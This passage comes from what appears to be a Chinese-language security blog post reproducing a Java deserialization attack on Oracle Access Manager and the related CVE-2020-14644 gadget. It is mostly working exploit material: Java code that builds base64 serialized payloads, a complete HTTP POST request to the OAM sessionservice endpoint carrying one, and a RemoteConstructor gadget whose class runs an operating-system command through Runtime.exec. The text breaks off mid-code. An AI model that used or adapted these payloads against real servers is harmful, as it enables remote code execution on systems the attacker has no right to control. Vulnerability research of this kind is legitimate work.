</span></span><span style=display:flex><span>        <span style=color:#75715e>// ç”Ÿæˆä¸€ä¸ªæœ€åŸºæœ¬çš„sessionID
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        SessionID sessionID<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> SessionID<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;neo&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>oamserialize<span style=color:#f92672>(</span>sessionID<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>//    https://gist.github.com/andy722/1524968
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#f92672>&lt;</span>T <span style=color:#66d9ef>extends</span> Serializable<span style=color:#f92672>&gt;</span> String <span style=color:#a6e22e>serialize</span><span style=color:#f92672>(</span>T item<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> ByteArrayOutputStream byteArrayOutputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayOutputStream<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> ObjectOutputStream objectOutputStream<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            objectOutputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream<span style=color:#f92672>(</span>byteArrayOutputStream<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            objectOutputStream<span style=color:#f92672>.</span><span style=color:#a6e22e>writeObject</span><span style=color:#f92672>(</span>item<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            objectOutputStream<span style=color:#f92672>.</span><span style=color:#a6e22e>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getEncoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>encodeToString</span><span style=color:#f92672>(</span>byteArrayOutputStream<span style=color:#f92672>.</span><span style=color:#a6e22e>toByteArray</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IOException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#f92672>&lt;</span>T <span style=color:#66d9ef>extends</span> Serializable<span style=color:#f92672>&gt;</span> String <span style=color:#a6e22e>oamserialize</span><span style=color:#f92672>(</span>T item<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        String data<span style=color:#f92672>=</span>serialize<span style=color:#f92672>(</span>item<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getEncoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>encodeToString</span><span style=color:#f92672>((</span><span style=color:#e6db74>&#34;object:&#34;</span><span style=color:#f92672>+</span>data<span style=color:#f92672>).</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>(</span>StandardCharsets<span style=color:#f92672>.</span><span style=color:#a6e22e>UTF_8</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>  
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å‘é€è¯·æ±‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>POST /oam/server/opensso/sessionservice HTTP/1.1
</span></span><span style=display:flex><span>Host: 192.168.175.139:14100
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept: */*
</span></span><span style=display:flex><span>Accept-Language: en
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q=0.9
</span></span><span style=display:flex><span>Content-Type: text/xml
</span></span><span style=display:flex><span>Content-Length: 906
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>RequestSet</span> <span style=color:#a6e22e>vers</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;vers123&#34;</span> <span style=color:#a6e22e>svcid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;session&#34;</span> <span style=color:#a6e22e>reqid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;req_1&#34;</span>&gt;
</span></span><span style=display:flex><span> &lt;<span style=color:#f92672>Request</span> <span style=color:#a6e22e>dtdid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;dtd1&#34;</span> <span style=color:#a6e22e>sid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;sid1&#34;</span>&gt;<span style=color:#75715e>&lt;![CDATA[
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;authIdentifier reqid=&#34;1&#34; requester=&#34;b2JqZWN0OnJPMEFCWE55QURodmNtRmpiR1V1YzJWamRYSnBkSGt1WVcwdWNISnZlSGt1YjNCbGJuTnpieTV6WlhOemFXOXVMblYwYVd4ekxsTmxjM05wYjI1SlJLOGVKQWl5c3BxUUFnQUhXZ0FJYVhOUVlYSnpaV1JNQUFwamIyOXJhV1ZOYjJSbGRBQVRUR3BoZG1FdmJHRnVaeTlDYjI5c1pXRnVPMHdBRDJWdVkzSjVjSFJsWkZOMGNtbHVaM1FBRWt4cVlYWmhMMnhoYm1jdlUzUnlhVzVuTzB3QURXVjRkR1Z1YzJsdmJsQmhjblJ4QUg0QUFrd0FDbVY0ZEdWdWMybHZibk4wQUE5TWFtRjJZUzkxZEdsc0wwMWhjRHRNQUE5elpYTnphVzl1VTJWeWRtVnlTVVJ4QUg0QUFrd0FCSFJoYVd4eEFINEFBbmh3QUhCMEFBTnVaVzl3YzNJQUVXcGhkbUV1ZFhScGJDNUlZWE5vVFdGd0JRZmF3Y01XWU5FREFBSkdBQXBzYjJGa1JtRmpkRzl5U1FBSmRHaHlaWE5vYjJ4a2VIQS9RQUFBQUFBQUFIY0lBQUFBRUFBQUFBQjRkQUFBY0E9PQ==&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;SessionID&gt;123&lt;/SessionID&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;/authIdentifier&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	]]&gt;</span>
</span></span><span style=display:flex><span> &lt;/<span style=color:#f92672>Request</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>RequestSet</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>ååºåˆ—åŒ–ç°åœº</p><p><img loading=lazy src=image-20220323114217807.png alt=image-20220323114217807></p><h3 id=å…³è”æ¼æ´cve-2020-14644>å…³è”æ¼æ´ï¼šCVE-2020-14644<a hidden class=anchor aria-hidden=true href=#å…³è”æ¼æ´cve-2020-14644>#</a></h3><p>æœ‰äº†å…¥å£ä»¥åï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªgadgetæ¥è®©æ‰§è¡Œæµç¨‹æœ€ç»ˆèµ°åˆ°è‡ªå®šä¹‰çš„æ¶æ„ä»£ç ã€‚ä½œè€…åœ¨åˆ†ææ–‡ç« ä¸­è¯´ä»–ä»¬ç»è¿‡å°è¯•å‘ç° CVE-2020â€“14644 çš„gadgetæ˜¯å¯ç”¨çš„ã€‚äºæ˜¯æˆ‘ä»¬å…ˆå¤ç° CVE-2020â€“14644 ã€‚</p><h4 id=æ„é€ ååºåˆ—åŒ–demo>æ„é€ ååºåˆ—åŒ–demo<a hidden class=anchor aria-hidden=true href=#æ„é€ ååºåˆ—åŒ–demo>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-19>19</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//package pers.neo;
</span></span></span><span style=display:flex><span><span style=color:#75715e>//import com.tangosol.internal.util.invoke.ClassDefinition;
</span></span></span><span style=display:flex><span><span style=color:#75715e>//import com.tangosol.internal.util.invoke.ClassIdentity;
</span></span></span><span style=display:flex><span><span style=color:#75715e>//import com.tangosol.internal.util.invoke.RemoteConstructor;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>cve_2020_14644</span><span style=color:#f92672>()</span> <span style=color:#66d9ef>throws</span> NotFoundException<span style=color:#f92672>,</span> IOException<span style=color:#f92672>,</span> CannotCompileException <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassIdentity classIdentity <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ClassIdentity<span style=color:#f92672>(</span>test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;$&#34;</span> <span style=color:#f92672>+</span> classIdentity<span style=color:#f92672>.</span><span style=color:#a6e22e>getVersion</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        RemoteConstructor constructor <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RemoteConstructor<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ClassDefinition<span style=color:#f92672>(</span>classIdentity<span style=color:#f92672>,</span> ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        String sobj <span style=color:#f92672>=</span> serialize<span style=color:#f92672>(</span>constructor<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        System.out.println(sobj);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        deserialize<span style=color:#f92672>(</span>sobj<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-58-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-58-29>29</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.Remotable<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.RemoteConstructor<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.Serializable<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test7</span> <span style=color:#66d9ef>implements</span> Remotable<span style=color:#f92672>,</span>Serializable <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>test7</span><span style=color:#f92672>()</span>  <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        String cmd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;calc&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        cmd<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;touch /tmp/hackedbyneo7&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        cmd=&#34;mkdir d:\\byoam&#34;;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmd<span style=color:#f92672>);</span>
